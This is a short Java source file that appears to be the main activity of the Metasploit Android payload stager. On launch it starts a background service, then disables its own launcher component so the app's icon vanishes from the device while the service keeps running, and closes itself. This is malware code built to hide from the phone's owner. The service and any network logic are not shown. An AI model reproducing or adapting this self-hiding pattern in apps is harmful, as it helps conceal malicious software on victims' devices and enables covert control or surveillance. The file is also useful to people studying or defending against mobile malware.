package com.metasploit.stage;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        startService(new Intent(this, MainService.class));
        disableActivity();
        finish();
    }

    private void disableActivity() {
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(getApplicationContext(),
                MainActivity.class);
        packageManager.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }
}
